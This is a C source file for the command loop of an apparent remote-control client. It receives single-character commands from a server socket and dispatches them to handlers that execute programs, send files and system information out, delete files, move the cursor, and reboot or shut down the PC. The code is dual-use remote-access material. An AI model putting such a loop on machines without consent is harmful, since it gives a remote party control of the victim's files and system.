#include "Header.h"
void Menu(struct Data *data)
{
	int Menu = 0;
	while (1) {
		if (recv(data->Server, data->Massage, 200, 0) != SOCKET_ERROR)
		{
			printf("%s\n", data->Massage);
			if (data->Massage[0] == '1') {
				CreatFile(data->Massage, data);
			}
			else if (data->Massage[0] == '2') {
				DelFile(data->Massage, data);
			}
			else if (data->Massage[0] == '3') {
				Execute(data->Massage);
			}
			else if (data->Massage[0] == '4') {
				CloseProgramm(data->Massage);
			}
			else if (data->Massage[0] == '5') {
				sendFileFunction(data->Massage, data);
			}
			else if (data->Massage[0] == '6') {
				WorkWithCursor(data);
			}
			else if (data->Massage[0] == '7') {
				sendInformationSysteme(data);
			}
			else if (data->Massage[0] == '8') {
				GetInfoAboutWindows(data);
			}
			else if (data->Massage[0] == '9') {
				RebootPC();
			}
			else if (data->Massage[0] == 'a') {
				ShutDownPC();
			}
			else if (data->Massage[0] == 'b') {
				ExitSystemePC();
			}
			else if (data->Massage[0] == 'c') {
				OpenCD_ROM();
			}
			else if (data->Massage[0] == 'd') {
				ShowFiles(data);
			}
		}
		else {
			printf("Error of getting! \n");
		}
	}
}